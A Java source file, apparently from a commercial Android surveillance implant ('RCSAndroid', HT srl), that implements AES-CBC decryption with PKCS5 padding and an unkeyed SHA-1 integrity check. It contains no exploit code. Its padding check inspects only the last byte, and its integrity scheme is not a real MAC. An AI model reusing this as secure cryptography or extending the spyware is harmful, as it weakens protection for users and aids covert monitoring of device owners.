/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : EncryptionPKCS5.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.service.crypto;

import java.util.Arrays;

import android.util.Log;

import com.android.service.Debug;
import com.android.service.util.Check;
import com.android.service.util.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class EncryptionPKCS5.
 */
public class EncryptionPKCS5 extends Encryption {

	/**
	 * Instantiates a new encryption pkc s5.
	 * 
	 * @param key
	 *            the key
	 */
	public EncryptionPKCS5(final byte[] key) {
		super(key);
	}

	/**
	 * Instantiates a new encryption pkc s5.
	 */
	public EncryptionPKCS5() {
		super(Keys.self().getAesKey());
	}

	/** The Constant DIGEST_LENGTH. */
	private static final int DIGEST_LENGTH = 20;
	/** The debug. */
	private static String TAG = "EncryptionPKCS5";
	/**
	 * Gets the next multiple.
	 * 
	 * @param len
	 *            the len
	 * @return the next multiple
	 */
	@Override
	public int getNextMultiple(final int len) {
		Check.requires(len >= 0, "len < 0");
		final int newlen = len + (16 - len % 16);
		Check.ensures(newlen > len, "newlen <= len");
		Check.ensures(newlen % 16 == 0, "Wrong newlen");
		return newlen;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.crypto.Encryption#pad(byte[], int, int)
	 */
	@Override
	protected byte[] pad(final byte[] plain, final int offset, final int len) {
		return pad(plain, offset, len, true);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.crypto.Encryption#decryptData(byte[], int, int)
	 */
	@Override
	public byte[] decryptData(final byte[] cyphered, final int enclen,
			final int offset) throws CryptoException {
		// int padlen = cyphered[cyphered.length -1];
		// int plainlen = enclen - padlen;
		Check.requires(enclen % 16 == 0, "Wrong padding");
		// Check.requires(enclen >= plainlen, "Wrong plainlen");
		final byte[] paddedplain = new byte[enclen];
		byte[] plain = null;
		int plainlen = 0;
		byte[] iv = new byte[16];

		final byte[] pt = new byte[16];

		final int numblock = enclen / 16;
		for (int i = 0; i < numblock; i++) {
			final byte[] ct = Utils.copy(cyphered, i * 16 + offset, 16);

			crypto.decrypt(ct, pt);
			xor(pt, iv);
			iv = Utils.copy(ct);
			System.arraycopy(pt, 0, paddedplain, i * 16, 16);
		}

		final int padlen = paddedplain[paddedplain.length - 1];

		if (padlen <= 0 || padlen > 16) {
			Log.d("QZ", TAG + " Error: decryptData, wrong padlen: " + padlen);
			throw new CryptoException();
		}

		plainlen = enclen - padlen;
		plain = new byte[plainlen];

		System.arraycopy(paddedplain, 0, plain, 0, plainlen);
		Check.ensures(plain != null, "null plain");
		Check.ensures(plain.length == plainlen, "wrong plainlen");
		return plain;
	}

	/**
	 * Encrypt data integrity.
	 * 
	 * @param plain
	 *            the plain
	 * @return the byte[]
	 */
	public byte[] encryptDataIntegrity(final byte[] plain) {

		final byte[] sha = SHA1(plain);
		final byte[] plainSha = Utils.concat(plain, sha);
		Check.asserts(sha.length == DIGEST_LENGTH, "sha.length");
		Check.asserts(plainSha.length == plain.length + DIGEST_LENGTH,
				"plainSha.length");
		return encryptData(plainSha, 0);
	}

	/**
	 * Decrypt data integrity.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptDataIntegrity(final byte[] cyphered)
			throws CryptoException {
		final byte[] plainSha = decryptData(cyphered, 0);
		final byte[] plain = Utils.copy(plainSha, 0, plainSha.length
				- DIGEST_LENGTH);
		final byte[] sha = Utils.copy(plainSha,
				plainSha.length - DIGEST_LENGTH, DIGEST_LENGTH);
		final byte[] calculatedSha = SHA1(plainSha, 0, plainSha.length
				- DIGEST_LENGTH);
		// Check.asserts(SHA1Digest.DIGEST_LENGTH == 20, "DIGEST_LENGTH");
		Check.asserts(plain.length + DIGEST_LENGTH == plainSha.length,
				"plain.length");
		Check.asserts(sha.length == DIGEST_LENGTH, "sha.length");
		Check.asserts(calculatedSha.length == DIGEST_LENGTH,
				"calculatedSha.length");
		if (Arrays.equals(calculatedSha, sha)) {
			return plain;
		} else {
			Log.d("QZ", TAG + " Error: decryptDataIntegrity: sha error!");
			throw new CryptoException();
		}
	}

}
